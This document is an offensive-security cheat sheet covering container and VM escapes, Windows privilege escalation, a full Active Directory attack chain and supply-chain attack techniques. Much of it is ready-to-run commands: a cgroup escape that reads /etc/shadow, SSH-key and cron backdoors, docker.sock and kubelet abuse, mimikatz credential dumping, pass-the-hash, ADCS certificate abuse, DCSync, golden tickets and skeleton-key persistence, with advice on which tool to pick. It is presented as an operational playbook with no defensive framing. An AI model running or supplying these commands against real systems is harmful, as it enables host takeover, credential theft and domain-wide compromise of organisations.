# Container Escape, VM Escape & Windows Privilege Escalation

## CONTAINER ESCAPE TECHNIQUES (2025-2026)

### 1. Privileged Container Escape
```
Condition: Container runs with --privileged or dangerous capabilities

Method A: Mount host filesystem
  mkdir /tmp/host && mount /dev/sda1 /tmp/host
  # Now have full R/W access to host filesystem
  # Add SSH key: echo "key" >> /tmp/host/root/.ssh/authorized_keys
  # Add cron backdoor: echo "* * * * * /bin/bash -c '...'" >> /tmp/host/var/spool/cron/root

Method B: cgroup release_agent escape
  mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
  echo 1 > /tmp/cgrp/x/notify_on_release
  host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
  echo "$host_path/cmd" > /tmp/cgrp/release_agent
  echo '#!/bin/sh' > /cmd && echo "cat /etc/shadow > $host_path/output" >> /cmd
  chmod +x /cmd && sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
  # cmd executes on HOST as root

Method C: nsenter to host PID namespace
  nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
  # Shell in host's PID 1 namespace = full host access
```

### 2. Capability-Based Escape
```
CAP_SYS_ADMIN:
  - Mount host filesystem
  - Use FUSE to create custom filesystem
  - Abuse cgroup notify_on_release

CAP_SYS_PTRACE:
  - ptrace host processes via /proc/[pid]
  - Inject shellcode into host process
  - Read host process memory (credentials)

CAP_NET_ADMIN + CAP_NET_RAW:
  - Capture host network traffic
  - ARP spoofing on host network
  - MITM other containers

CAP_DAC_READ_SEARCH:
  - open_by_handle_at() to access any file on host
  - Bypass all DAC file permission checks
  - shocker exploit pattern

Detection: capsh --print | grep cap
```

### 3. Kernel Exploit from Container
```
Container shares kernel with host → kernel exploit = host escape

Pattern:
1. Identify kernel version: uname -r
2. Find applicable CVE (DirtyPipe, DirtyCow, nf_tables, io_uring, etc.)
3. Exploit kernel vulnerability from within container
4. Gain root on HOST (escape container boundary)

Key vulns (2024-2026):
- CVE-2024-1086 (nf_tables): UAF → arbitrary write → root
- CVE-2024-21626 (runc): fd leak → container escape
- CVE-2025-XXXXX (runc 3 vulns disclosed 2025): root access to host
- io_uring bugs: multiple LPE vulns per year
- eBPF verifier bugs: type confusion → kernel R/W
```

### 4. Docker Socket Escape
```
If /var/run/docker.sock mounted in container:

# Create privileged container that mounts host root
docker run -v /:/host --privileged -it alpine chroot /host bash
# Now have full host filesystem access as root

# OR: Deploy container with host PID/network namespace
docker run --pid=host --network=host --privileged -it alpine
```

### 5. Kubernetes-Specific Escapes
```
ServiceAccount token abuse:
  cat /var/run/secrets/kubernetes.io/serviceaccount/token
  # Use token to access Kubernetes API
  # Create privileged pod on target node

etcd access:
  # If etcd exposed/accessible → read ALL secrets
  etcdctl get / --prefix --keys-only
  etcdctl get /registry/secrets/default/admin-token

Kubelet API (port 10250):
  curl https://node:10250/run/namespace/pod/container -d "cmd=id"
  # Direct command execution in any pod on that node

Node access via pod spec:
  spec:
    hostNetwork: true
    hostPID: true
    hostIPC: true
    containers:
    - securityContext:
        privileged: true
      volumeMounts:
      - mountPath: /host
        name: noderoot
    volumes:
    - name: noderoot
      hostPath:
        path: /
```

---

## VM ESCAPE (Guest-to-Host)

### VMM Memory Corruption (Mythos Pattern)
```
Mythos found memory corruption in production memory-safe VMM:
- Bug in unsafe{} operation (Rust VMM)
- Gives malicious guest OOB write to host process memory
- Trivial DoS, potentially exploitable for code execution

Where unsafe lives in VMMs:
- Device emulation (virtio backends)
- Memory mapping (guest physical → host virtual translation)
- Interrupt injection (MSI/MSI-X)
- DMA handling (IOMMU bypass paths)
- PCI configuration space access
```

### QEMU/KVM Escape Patterns
```
1. Device emulation bugs:
   - USB device emulation (heap overflow in descriptor parsing)
   - Network device (virtio-net, e1000: buffer management)
   - GPU passthrough (DMA to arbitrary host memory)
   - Storage (virtio-blk: scatter-gather list corruption)

2. Shared memory / vhost:
   - vhost-user: guest manipulates shared rings
   - virtio split/packed ring confusion
   - Memory ordering bugs in lock-free ring buffer

3. VM migration:
   - State deserialization vulnerabilities during live migration
   - Snapshot restore with stale pointers
```

---

## WINDOWS PRIVILEGE ESCALATION

### 1. Token Impersonation (SeImpersonatePrivilege)
```
Who has it: IIS, MSSQL, service accounts, Network Service, Local Service

The Potato Family (2016-2026):
┌─────────────────────────────────────────────────────────────────┐
│ Tool          │ Year │ Technique                                │
├─────────────────────────────────────────────────────────────────┤
│ HotPotato     │ 2016 │ NBNS spoofing + WPAD + NTLM relay       │
│ RottenPotato  │ 2016 │ DCOM → negotiate NTLM → impersonate     │
│ JuicyPotato   │ 2018 │ DCOM CLSID abuse → SYSTEM token         │
│ PrintSpoofer  │ 2020 │ Spooler named pipe trick → SYSTEM        │
│ RoguePotato   │ 2020 │ Remote OXID resolver + pipe impersonate  │
│ Sweet Potato  │ 2020 │ Combined Juicy + Print + Rogue           │
│ GodPotato     │ 2023 │ Works on ALL Windows versions (universal)│
│ CoercedPotato │ 2024 │ Multiple coercion + pipe impersonation   │
│ SilverPotato  │ 2024 │ Cross-session activation → any user token│
└─────────────────────────────────────────────────────────────────┘

Pattern (all Potatoes):
1. Trick SYSTEM-level service to authenticate to attacker's named pipe
2. Impersonate the SYSTEM token via ImpersonateNamedPipeClient()
3. CreateProcessWithToken() → SYSTEM shell

When to use which:
- SeImpersonatePrivilege available: GodPotato (universal), PrintSpoofer (simple)
- Older Windows: JuicyPotato
- Server 2019+: PrintSpoofer or GodPotato
- Domain-joined: CoercedPotato (uses authentication coercion)
```

### 2. Named Pipe Impersonation
```
1. Create named pipe server (\\.\pipe\attacker)
2. Trick privileged process to connect as CLIENT
3. Call ImpersonateNamedPipeClient() → get their token
4. Use token for CreateProcess / access check bypass

Coercion methods (trick SYSTEM to connect):
- Print Spooler (SpoolSS): RpcRemoteFindFirstPrinterChangeNotification
- PetitPotam: EfsRpcOpenFileRaw (encrypting file system)
- DFSCoerce: NetrDfsRemoveStdRoot
- ShadowCoerce: MS-FSRVP shadow copy protocol
- MDFCoerce: ReadProcessMemory via MSDFS
```

### 3. Service Exploitation
```
Unquoted service path:
  C:\Program Files\Vuln App\service.exe
  → Place C:\Program.exe or C:\Program Files\Vuln.exe

Weak service permissions:
  accesschk.exe -uwcqv "Users" * /accepteula
  # If Users have SERVICE_CHANGE_CONFIG:
  sc config VulnService binpath="cmd /c net localgroup administrators user /add"
  sc stop VulnService && sc start VulnService

DLL hijacking:
  - Find service that loads DLL from writable path
  - Place malicious DLL in that path
  - Restart service → DLL executed as SYSTEM

Registry permissions:
  - Check: reg query HKLM\SYSTEM\CurrentControlSet\Services\VulnSvc
  - If writable: change ImagePath to attacker binary
```

### 4. UAC Bypass (Medium → High Integrity)
```
Techniques (2025-2026):
- fodhelper.exe: Registry key hijack → cmd as admin
- eventvwr.exe: mscfile registry → admin command
- sdclt.exe: App Paths registry → bypass
- computerdefaults.exe: ms-settings protocol handler
- DiskCleanup scheduled task: environment variable DLL hijack

Auto-elevating COM objects:
- CMSTPLUA: CoCreate + ICMLuaUtil interface
- ColorDataProxy: hijack via registry
- FileOperation: silent elevation for file ops
```

---

## ACTIVE DIRECTORY COMPLETE KILL CHAIN

### Phase 1: Enumeration (Any Domain User)
```
Tools: BloodHound/SharpHound, PowerView, ldapsearch, CrackMapExec

Key queries:
- All users: Get-DomainUser
- Service accounts (Kerberoastable): Get-DomainUser -SPN
- Computers: Get-DomainComputer
- Groups: Get-DomainGroup -AdminCount
- ACLs: Find-InterestingDomainAcl
- Delegation: Get-DomainComputer -Unconstrained
- ADCS: certipy find -u user@domain -p pass -dc-ip DC
- Shares: Find-DomainShare -CheckShareAccess
- GPO: Get-DomainGPO | Get-GPPermission
```

### Phase 2: Credential Harvesting
```
Kerberoasting:
  GetUserSPNs.py domain/user:pass -dc-ip DC -request
  # Crack TGS tickets offline with hashcat -m 13100

AS-REP Roasting:
  GetNPUsers.py domain/ -dc-ip DC -no-pass -usersfile users.txt
  # Users without pre-auth → crackable AS-REP (hashcat -m 18200)

LSASS dumping (on compromised host):
  mimikatz: sekurlsa::logonpasswords
  pypykatz: pypykatz lsa minidump lsass.dmp
  Alternatives: nanodump, MiniDumpWriteDump, comsvcs.dll

DPAPI:
  mimikatz: dpapi::masterkey + dpapi::cred
  # Decrypt saved credentials, browser passwords, certificates

SAM/SYSTEM:
  reg save HKLM\SAM sam && reg save HKLM\SYSTEM system
  secretsdump.py -sam sam -system system LOCAL
```

### Phase 3: Lateral Movement
```
Pass-the-Hash (PTH):
  crackmapexec smb targets -u admin -H NTLM_HASH
  psexec.py domain/admin@target -hashes :NTLM_HASH

Pass-the-Ticket (PTT):
  export KRB5CCNAME=admin.ccache
  psexec.py -k -no-pass domain/admin@target

Overpass-the-Hash:
  getTGT.py domain/user -hashes :NTLM_HASH
  # Convert NTLM to Kerberos TGT

WMI/WinRM/SMB execution:
  wmiexec.py, smbexec.py, atexec.py, winrm (evil-winrm)
```

### Phase 4: Privilege Escalation to Domain Admin
```
ADCS Exploitation (ESC1-ESC16):
  ESC1: Template allows SAN + enrollee supplies subject + Client Auth
    certipy req -u user@domain -p pass -ca CA -template VulnTemplate -alt-name admin@domain
    certipy auth -pfx admin.pfx -dc-ip DC
    # Now have Domain Admin TGT!

  ESC4: Template ACL allows modification → convert to ESC1
    certipy template -u user@domain -p pass -template VulnTemplate -save-old
    # Modify template to enable ESC1 conditions, exploit, restore

  ESC8: NTLM relay to ADCS web enrollment
    ntlmrelayx.py -t http://ca/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
    PetitPotam.py listener DC  # Coerce DC to authenticate
    certipy auth -pfx dc.pfx  # Auth as DC → DCSync

Shadow Credentials:
  pywhisker -d domain -u user -p pass --target admin --action add
  gettgtpkinit.py domain/admin admin.ccache -cert-pfx cert.pfx
  # Now have admin TGT without knowing password!

RBCD (Resource-Based Constrained Delegation):
  # If GenericWrite on computer object:
  addcomputer.py domain/user:pass -computer-name 'EVIL$' -computer-pass 'Pass123'
  rbcd.py -delegate-from 'EVIL$' -delegate-to target$ -dc-ip DC domain/user:pass
  getST.py -spn cifs/target.domain -impersonate admin domain/'EVIL$':'Pass123'

Unconstrained Delegation:
  # If compromised host has unconstrained delegation:
  # Coerce DC to authenticate → TGT cached in memory
  SpoolSample.exe DC UnconsHost
  mimikatz: kerberos::list → extract DC$ TGT → DCSync
```

### Phase 5: Domain Dominance
```
DCSync (requires Replication rights):
  secretsdump.py domain/admin@DC -just-dc-ntlm
  # Dumps ALL domain hashes including krbtgt

Golden Ticket (requires krbtgt hash):
  ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain admin
  # Forge TGT for ANY user, valid until krbtgt rotated (often: never)

Silver Ticket (requires service hash):
  ticketer.py -nthash SERVICE_HASH -domain-sid SID -domain domain -spn cifs/target admin

Skeleton Key:
  mimikatz: misc::skeleton
  # Inject into LSASS on DC → ANY password works alongside real one

AdminSDHolder persistence:
  # Modify AdminSDHolder ACL → propagates to all protected groups every 60min
  # Add low-priv user to AdminSDHolder → persistent admin access
```

---

## SUPPLY CHAIN ATTACK TECHNIQUES

### Dependency Confusion
```
1. Identify internal package names (from error messages, source code, job postings)
2. Register same name on public registry (npm, PyPI, RubyGems) with higher version
3. Build system pulls public package (higher version) instead of internal
4. Malicious postinstall script executes during build

Detection of targets:
  - Read package.json / requirements.txt for unusual package names
  - Error messages often reveal internal package names
  - CI/CD configs reference private registries
```

### CI/CD Pipeline Exploitation
```
GitHub Actions:
  - Pull request from fork → if workflow has pull_request_target → code execution
  - Poisoned dependency in workflow (actions/checkout@malicious-tag)
  - Secret exfiltration via workflow logs or artifact upload

Jenkins:
  - Shared library injection (if Groovy sandbox escape available)
  - Credential theft from /credentials/ page
  - Pipeline script injection via parameter manipulation

GitLab CI:
  - Runner token theft → register malicious runner
  - Include directive → remote template injection
  - Artifact poisoning between pipeline stages
```

### Package Repository Attacks
```
Typosquatting: register similar-name packages (e.g., requsets vs requests)
Namespace confusion: organization vs user package priority
Maintainer compromise: takeover abandoned packages, add malicious update
Build script exploitation: setup.py / postinstall in packages
Star jacking: transfer repo ownership to point GitHub stars at malicious code
```
